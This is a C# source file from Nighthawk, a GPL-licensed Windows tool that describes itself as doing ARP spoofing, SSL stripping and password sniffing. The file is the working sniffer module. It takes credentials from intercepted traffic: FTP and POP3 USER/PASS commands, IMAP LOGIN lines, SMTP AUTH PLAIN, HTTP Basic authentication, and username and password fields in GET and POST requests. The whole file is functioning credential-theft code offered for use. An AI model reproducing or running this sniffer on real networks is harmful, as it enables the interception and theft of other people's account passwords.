using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.Text.RegularExpressions;
using PacketDotNet;
using System.Threading;

/**
Nighthawk - ARP/ND spoofing, simple SSL stripping and password sniffing for Windows
Copyright (C) 2011, 2012  Klemen Bratec

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
**/
namespace Nighthawk
{
    /* Basic password sniffer */
    public class Sniffer
    {
        public bool Started;

        private bool excludeLocalIP;
        private DeviceInfo deviceInfo;

        // packet queues (packet storage for BG threads)
        public List<TcpPacket> PacketQueue = new List<TcpPacket>();
        private List<TcpPacket> threadQueue = new List<TcpPacket>();

        private UTF8Encoding encoding = new UTF8Encoding();

        private Thread worker;

        // collection of POST requests (hostname/url tracking for incomplete packets)
        private List<SnifferPostRequest> postRequests;

        // collections of partial logins
        private List<SnifferFTPlogin> ftpLogins;
        private List<SnifferPOP3login> pop3Logins;

        // events
        public event SnifferResultHandler SnifferResult;

        private void Result(string url, string username, string password, string aditional, SnifferResultType type)
        {
            if (SnifferResult != null) SnifferResult(url, username, password, aditional, type);
        }

        // field names - username
        private string[] fieldNamesUser = new string[]
        {
            "user",
            "usr",
            "username",
            "name",
            "email",
            "mail",
            "account",
            "user-name",
            "log",
            "ime",
            "uporabni"
        };

        // field names - password
        private string[] fieldNamesPassword = new string[]
        {
            "pass",
            "password",
            "key",
            "pwd",
            "geslo"
        };


        // excluded field names - username
        private string[] excludedFieldNamesUsername = new string[]
        {
            "api_key",
            "app_id",
            "blobheadername1",
            "__user",
            "mf_story_key",
            "timezone"
        };

        // excluded field names - password
        private string[] excludedFieldNamesPassword = new string[]
        {
            "session_key_only",
            "api_key",
            "app_id",
            "blobkey",
            "mf_story_key",
            "timezone"
        };

        public Sniffer(DeviceInfo deviceInfo)
        {
            this.deviceInfo = deviceInfo;
        }

        // start sniffer (exclude local traffic)
        public void Start(bool excludeLocalIP)
        {
            this.excludeLocalIP = excludeLocalIP;

            Started = true;

            postRequests = new List<SnifferPostRequest>();
            ftpLogins = new List<SnifferFTPlogin>();
            pop3Logins = new List<SnifferPOP3login>();

            // start a worker thread
            worker = new Thread(new ThreadStart(Worker));
            worker.Name = "Sniffer thread";
            worker.Start();
        }

        // stop sniffer
        public void Stop()
        {
            Started = false;

            if(worker != null && worker.IsAlive) worker.Join();
        }
        
        // worker function for parsing packets
        public void Worker()
        {
            while (Started)
            {
                // copy packets to threadQueue
                lock (PacketQueue)
                {
                    foreach (TcpPacket packet in PacketQueue)
                    {
                        threadQueue.Add(packet);
                    }

                    PacketQueue.Clear();
                }

                if (threadQueue.Count > 0)
                {
                    // loop through packets and check them for any useful information
                    foreach (TcpPacket packet in threadQueue)
                    {
                        if (packet.ParentPacket == null) continue;
                        
                        var sourceIP = ((IpPacket) packet.ParentPacket).SourceAddress;
                        var destIP = ((IpPacket) packet.ParentPacket).DestinationAddress;

                        // check for exclusions
                        if (excludeLocalIP)
                        {
                            if (sourceIP.ToString() == deviceInfo.IP || deviceInfo.IPv6List.Contains(sourceIP.ToString()))
                            {
                                continue;
                            }
                        }

                        // check for FTP packet
                        if (packet.DestinationPort == 21)
                        {
                            var logins = ftpLogins.Where(l => (l.DestinationAddress.ToString() == destIP.ToString() && l.SourceAddress.ToString() == sourceIP.ToString()));

                            // parse TCP packet data
                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";

                            // check if connection already started
                            if (logins.Count() > 0)
                            {
                                var login = logins.Last();

                                // get user
                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "USER")
                                {
                                    var parts = data.Split(' ');
                                    if(parts.Length > 1) login.User = parts[1].Replace("\r\n", "");
                                }

                                // get password
                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "PASS")
                                {
                                    var parts = data.Split(' ');
                                    if (parts.Length > 1) login.Password = parts[1].Replace("\r\n", "");

                                    Result(login.DestinationAddress.ToString(), login.User, login.Password, "/", SnifferResultType.FTP);

                                    ftpLogins.Remove(login);
                                }
                            }
                            else
                            {
                                ftpLogins.Add(new SnifferFTPlogin { DestinationAddress = destIP, SourceAddress = sourceIP });
                            }

                            continue;
                        }

                        // check for IMAP
                        if (packet.DestinationPort == 143)
                        {
                            // parse TCP packet data
                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";

                            // TAG LOGIN "username" "password"
                            var regexIMAP = new Regex("(.*?) login \"(.*?)\" \"(.*?)\"");
                            var matches = SimpleRegex.GetMatches(regexIMAP, data);

                            if (matches.Count > 0)
                            {
                                Result(sourceIP.ToString(), matches[2], matches[3], "/", SnifferResultType.IMAP);
                            }

                            continue;
                        }

                        // check for SMTP
                        if (packet.DestinationPort == 25)
                        {
                            // parse TCP packet data
                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";

                            // AUTH PLAIN base64
                            var regexSMTP = new Regex("AUTH PLAIN (.*?)$");
                            var matches = SimpleRegex.GetMatches(regexSMTP, data);

                            if (matches.Count > 0)
                            {
                                var credentials = encoding.GetString(Convert.FromBase64String(matches[1].Replace("\r", ""))).Split(Convert.ToChar(0x0));

                                if (credentials.Length > 2) Result(sourceIP.ToString(), credentials[1], credentials[2], "/", SnifferResultType.SMTP);
                            }

                            continue;
                        }

                        // check for POP3
                        if (packet.DestinationPort == 110)
                        {
                            var logins = pop3Logins.Where(l => (l.DestinationAddress.ToString() == destIP.ToString() && l.SourceAddress.ToString() == sourceIP.ToString()));

                            // parse TCP packet data
                            var data = packet.PayloadData != null ? encoding.GetString(packet.PayloadData) : "";

                            // check if connection already started
                            if (logins.Count() > 0)
                            {
                                var login = logins.Last();

                                // get user
                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "USER")
                                {
                                    var parts = data.Split(' ');
                                    if (parts.Length > 1) login.User = parts[1].Replace("\r\n", "");
                                }

                                // get password
                                if (data.Length > 4 && data.Substring(0, 4).ToUpper() == "PASS")
                                {
                                    var parts = data.Split(' ');
                                    if (parts.Length > 1) login.Password = parts[1].Replace("\r\n", "");

                                    Result(login.DestinationAddress.ToString(), login.User, login.Password, "/", SnifferResultType.POP3);

                                    pop3Logins.Remove(login);
                                }
                            }
                            else
                            {
                                pop3Logins.Add(new SnifferPOP3login { DestinationAddress = destIP, SourceAddress = sourceIP });
                            }

                            continue;
                        }

                        // check for HTTP packet and parse it
                        if (HttpPacket.IsHTTP(packet) || HttpPacket.HasPOST(packet))
                        {
                            var http = new HttpPacket(packet);

                            // save hostnames for incomplete packets
                            if (http.Header.Type == HttpHeader.PacketType.Request && http.Header.ReqType == HttpHeader.RequestType.POST)
                            {
                                postRequests.Add(new SnifferPostRequest {SourceAddress = sourceIP, DestinationAddress = destIP, Hostname = http.Header.Host});
                            }

                            SnifferSearch(http, sourceIP, destIP);
                        }
                    }

                    threadQueue.Clear();
                }
                else
                {
                    Thread.Sleep(50);
                }
            }

            return;
        }

        // search for HTTP 401 and HTML forms passwords
        public void SnifferSearch(HttpPacket packet, IPAddress sourceIP, IPAddress destIP)
        {
            var user = string.Empty;
            var password = string.Empty;

            // check for 401 authentication
            if(packet.Header.Authorization != string.Empty)
            {
                try
                {
                    // clear out "BASIC"
                    var auth = packet.Header.Authorization.Replace("Basic ", "");

                    // convert from Base64
                    var bytes = Convert.FromBase64String(auth);
                    var credentials = encoding.GetString(bytes);

                    // split user:password
                    var userData = credentials.Split(':');

                    Result(packet.Header.Host, userData[0], userData[1], "", SnifferResultType.HTTPAuth);
                }
                catch { }
            }

            var hostname = packet.Header.Host;

            // check for any GET params
            if (packet.Header.GetParams.Count > 0)
            {
                foreach (string[] param in packet.Header.GetParams)
                {              
                    // check for field names - username
                    if (fieldNamesUser.Where(s => param[0].Contains(s)).Count() > 0 && user == string.Empty && !excludedFieldNamesUsername.Contains(param[0]))
                    {
                        user = param[1];
                    }
                    
                    // password
                    if (fieldNamesPassword.Where(s => param[0].Contains(s)).Count() > 0 && password == string.Empty && !excludedFieldNamesPassword.Contains(param[0]))
                    {
                        password = param[1];
                    }
                }

                if (user != string.Empty && password != string.Empty)
                {
                    Result((packet.Header.Host != string.Empty ? packet.Header.Host : "/"), Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), "GET method", SnifferResultType.HTML);
                }
            }

            user = string.Empty;
            password = string.Empty;

            // check for any POST params
            if (packet.PostParams.Count > 0)
            {
                foreach (string[] param in packet.PostParams)
                {
                    // check for field names - username
                    if (fieldNamesUser.Where(s => param[0].Contains(s)).Count() > 0 && user == string.Empty && !excludedFieldNamesUsername.Contains(param[0]))
                    {
                        user = param[1];
                    }
                    
                    // password
                    if (fieldNamesPassword.Where(s => param[0].Contains(s)).Count() > 0 && password == string.Empty && !excludedFieldNamesPassword.Contains(param[0]))
                    {
                        password = param[1];
                    }
                }

                // create output
                if (user != string.Empty && password != string.Empty)
                {
                    var comment = "POST method";
                    hostname = packet.Header.Host;

                    // get hostname/url
                    if (hostname == string.Empty)
                    {
                        var posts = postRequests.Where(r => (r.SourceAddress.ToString() == sourceIP.ToString() && r.DestinationAddress.ToString() == destIP.ToString()));

                        if (posts.Count() > 0)
                        {
                            hostname = posts.First().Hostname;
                            // comment += " *";

                            postRequests.Remove(posts.First());
                        }
                    }

                    Result(hostname, Uri.UnescapeDataString(user), Uri.UnescapeDataString(password), comment, SnifferResultType.HTML);
               }
            }
        }
    }

    public enum SnifferResultType
    {
        HTTPAuth,
        HTML,
        FTP,
        IMAP,
        POP3,
        SMTP
    }

    public class SnifferPostRequest
    {
        public IPAddress SourceAddress;
        public IPAddress DestinationAddress;
        public uint SequenceNumber;
        public string Hostname;
    }

    public class SnifferFTPlogin
    {
        public IPAddress SourceAddress;
        public IPAddress DestinationAddress;
        public string User;
        public string Password;
    }

    public class SnifferPOP3login
    {
        public IPAddress SourceAddress;
        public IPAddress DestinationAddress;
        public string User;
        public string Password;
    }

    public delegate void SnifferResultHandler(string url, string username, string password, string aditional, SnifferResultType type);
}
